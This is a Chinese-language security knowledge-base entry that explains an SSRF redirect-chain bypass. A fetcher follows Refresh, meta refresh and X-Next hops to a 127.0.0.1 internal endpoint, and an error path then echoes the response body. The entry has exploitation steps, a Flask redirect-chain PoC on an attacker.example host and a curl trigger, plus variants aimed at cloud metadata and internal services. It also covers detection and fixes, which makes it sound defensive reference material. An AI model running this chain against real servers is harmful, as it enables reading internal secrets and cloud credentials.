---
id: web-generic-ssrf-redirect-chain-meta-refresh-error-body
title: SSRF 重定向链绕过与错误路径回显：Refresh/Meta Refresh/X-Next 七跳访问 127.0.0.1 内部接口
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-redirect-chain-meta-refresh-error-body-disclosure
tags:
- ssrf
- redirect-chain
- meta-refresh
- x-next
- internal-service
- error-handling
- response-disclosure
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:04+08:00'
  notes: 已对照原文核对：/fetch 手动跟随 Refresh/Meta Refresh/X-Next、MAX_TOTAL_STEPS=30、walked_steps=len(history)-1>=ERROR_COUNT=6 时回显 last_resp.text[:5000]、内网 /_internal/secret 仅 127.0.0.1/::1，与原文源码/exp 一致。注意原文未体现初始 URL 黑名单校验，链条核心是凑足 walked_steps 触发错误回显。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-redirect-chain-meta-refresh-error-body/
draft: false
kb_aliases:
- SSRF 重定向链
- Refresh 头重定向 SSRF
- Meta Refresh 跟随
- X-Next 401 重定向
- 重定向链绕过内网校验
- 错误路径回显响应体
- walked_steps 泄露
---

## 一句话结论

当服务端抓取器自己解析并跟随 `Refresh` 响应头、HTML `meta http-equiv=refresh` 和 401/407/429 响应上的 `X-Next` 头时，攻击者可用自己的服务器把重定向链一路引到 `http://127.0.0.1:5000/_internal/secret`；同时若代码在“跟随次数达到阈值 + 响应解析失败”时直接回显原始响应体，则盲 SSRF 立即变成可读内部接口的完整回显。

## 原理

- **服务端跟随重定向**：目标 `/fetch?url=` 用 `requests.get(..., allow_redirects=False)` 手动循环，按优先级检查三种“重定向语义”：`Refresh` 响应头（`0; url=...`）、HTML 中的 `<meta http-equiv="refresh" content="0;url=...">`、以及状态码 401/407/429 时的 `X-Next` 头。每次命中就把 `current_url` 设为新 URL，最多 30 步。
- **重定向链绕过**：应用若只校验用户传入的初始 URL（或只封禁字面量内网地址），攻击者让初始 URL 指向自己的公网服务器，再由该服务器返回 302 之外的 Refresh/Meta/X-Next 重定向，最终一跳指向 `127.0.0.1`；抓取器会以服务端身份请求内网地址，`remote_addr` 校验看到的是 `127.0.0.1`/`::1`，从而放行。
- **内部接口特征**：`/_internal/secret` 仅允许本机来源，返回 `OK Secret: <secret>`，但把 `Content-Type` 设为 `application/json`——内容却不是 JSON。抓取器看到 JSON 类型会调用 `.json()` 解析，必然抛异常。
- **错误路径回显**：`/fetch` 在解析失败时比较 `walked_steps = len(history)-1` 与阈值 `ERROR_COUNT=6`：小于阈值只返回通用错误，大于等于阈值则把 `last_resp.text[:5000]` 以 `text/plain` 直接返回。攻击者构造 7 次请求（0→6）正好满足条件，内部响应体被原样回显。
- **为什么成立**：“跟随重定向”把一次请求拆成多次服务端请求，安全边界却仍按单次请求/初始 URL 设计；错误处理又为了可诊断性把上游响应拼回给用户，两个弱点叠加即可读内网。即使内部接口返回非 JSON，也只是把“解析成功”变成“解析失败”，反而触发回显分支。

## 触发条件

- 服务端存在抓取 URL 的功能，且抓取器会跟随非标准重定向（Refresh 头、Meta Refresh、自定义 `X-Next`）。
- 初始 URL 可控；内网目标只做来源 IP 限制（如 `remote_addr in ("127.0.0.1","::1")`），而抓取器恰好从本机发起请求。
- 错误处理在“重定向次数达到阈值 + 响应体不符合预期格式”时回显原始响应。
- 攻击者有一台公网 HTTP 服务器可返回自定义响应头/HTML，并能被目标访问。
- 抓取器与内网目标在同一主机/同一容器网络，或能路由到 `127.0.0.1`。

## 利用步骤

1. 审计抓取逻辑：列出支持的重定向信号（Location、Refresh、Meta Refresh、X-Next 等）、最大跳数、每次跳转是否重新校验目标地址。
2. 识别内网目标接口及其访问控制（如仅 127.0.0.1 可访问），确认返回体与 `Content-Type` 是否故意不匹配。
3. 在公网服务器部署重定向链：前 6 跳轮流使用 Refresh 头、Meta Refresh、401+X-Next，最后一跳把 URL 指向 `http://127.0.0.1:<port>/_internal/secret`。
4. 让目标 `/fetch?url=http://<attacker>/chain/0`；观察是否完成 7 次请求（可在攻击服务器日志确认）。
5. 解析响应：若返回原始内部响应体则直接读取 secret/flag；若返回通用错误，调整链长使 `walked_steps >= ERROR_COUNT`，或让最终响应类型与代码预期不符以触发异常分支。
6. 若内网接口需要特定方法/头/Cookie，可在最后一跳用 Meta Refresh 无法携带时改用 X-Next/Refresh，或把目标换成支持 GET 的接口；必要时用链式重定向把查询参数带过去。
7. 记录完整 URL 链与响应，评估内网可达范围后停止。

## PoC

```python
# 攻击者服务器：前 6 跳混合三种重定向，最后一跳指向 127.0.0.1 内部接口
from flask import Flask, Response
app = Flask(__name__)
ATTACKER = "http://attacker.example:8888"
INTERNAL = "http://127.0.0.1:5000/_internal/secret"

@app.route("/chain/<int:step>")
def chain(step):
    if step < 6:
        if step % 3 == 0:                      # Refresh 响应头
            r = Response("Redirecting...")
            r.headers["Refresh"] = f"0; url={ATTACKER}/chain/{step+1}"
            return r
        if step % 3 == 1:                      # HTML Meta Refresh
            return f'<html><meta http-equiv="refresh" content="0;url={ATTACKER}/chain/{step+1}"></html>'
        r = Response("Auth required", status=401)   # X-Next
        r.headers["X-Next"] = f"{ATTACKER}/chain/{step+1}"
        return r
    return f'<meta http-equiv="refresh" content="0;url={INTERNAL}">'

app.run(host="0.0.0.0", port=8888)
```

```bash
# 触发：抓取器走完 7 步后，内部响应因解析失败且 walked_steps>=6 被回显
curl -s "http://target/fetch?url=http://attacker.example:8888/chain/0"
```

```text
预期：返回体包含内部接口的原始内容（如 OK Secret: ...）。
若只看到 Invalid JSON，检查链长是否达到阈值、最后一跳是否确实指向 127.0.0.1。
```

## 变体与关联

- 变体：重定向信号换成 `Location`（标准 3xx）、`window.location`（需浏览器）、JavaScript 跳转或 `document.location`（抓取器若执行 JS 才会跟）。
- 变体：内网目标改为云元数据 `169.254.169.254`、Redis/MySQL 端口、K8s API 等；重定向链同样可绕过只校验初始 URL 的 SSRF 防护。
- 变体：错误回显条件可能是“状态码非 200”“Content-Type 不匹配”“JSON schema 缺少字段”“解析异常”等；按代码构造使异常发生。
- 变体：若不允许出网，可把攻击服务器放在目标可访问的内网其他主机，或利用目标自身其他端点返回可控重定向。
- 关联：[[web-generic-ssrf-redirect-gopher-localhost-portscan-omi]]（重定向到 gopher 打内网）、[[web-generic-ssrf-short-form-ip-302-post-to-get]]（302 改变方法）、[[web-generic-open-redirect]]（开放重定向基础）、[[cloud-metadata]]（云元数据目标）。

## 检测与防御

- 修复：每次重定向后重新校验目标地址（解析到 IP 后拒绝内网/回环/链路本地/元数据网段），不要只校验初始 URL。
- 修复：限制跟随的重定向机制（只允许标准 3xx 且校验 `Location`），禁止 Refresh/Meta/X-Next 等自定义信号。
- 修复：错误路径不要回显上游原始响应体；记录到日志并用固定错误码/摘要返回。
- 加固：抓取器使用独立出口网络与 DNS 解析，禁用 `file`/`gopher`/`dict` 等协议；对 `127.0.0.1`、`::1`、`169.254.0.0/16`、私网段做统一拒绝。
- 检测：抓取日志中出现同一 URL 的多次链式跳转、`Refresh`/`X-Next` 响应头、目标为回环地址；内部接口出现异常的本机来源请求。
